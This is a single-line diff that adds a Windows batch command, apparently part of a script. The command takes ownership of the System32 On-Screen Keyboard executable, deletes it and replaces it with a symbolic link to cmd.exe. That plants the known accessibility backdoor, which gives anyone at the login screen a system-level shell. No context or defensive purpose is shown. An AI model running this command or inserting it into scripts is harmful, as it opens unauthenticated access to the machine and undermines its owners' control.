@@ -1,0 +1,1 @@
+"cmd.exe" /c IF NOT EXIST %%windir%%\System32\osk.exe.bak (copy %%windir%%\System32\osk.exe %%windir%%\System32\osk.exe.bak) ELSE ( pushd ) & takeown /F %%windir%%\System32\osk.exe /A & icacls %%windir%%\System32\osk.exe /grant Administrators:F /t & del %%windir%%\System32\osk.exe & mklink %%windir%%\System32\osk.exe %%windir%%\System32\cmd.exe
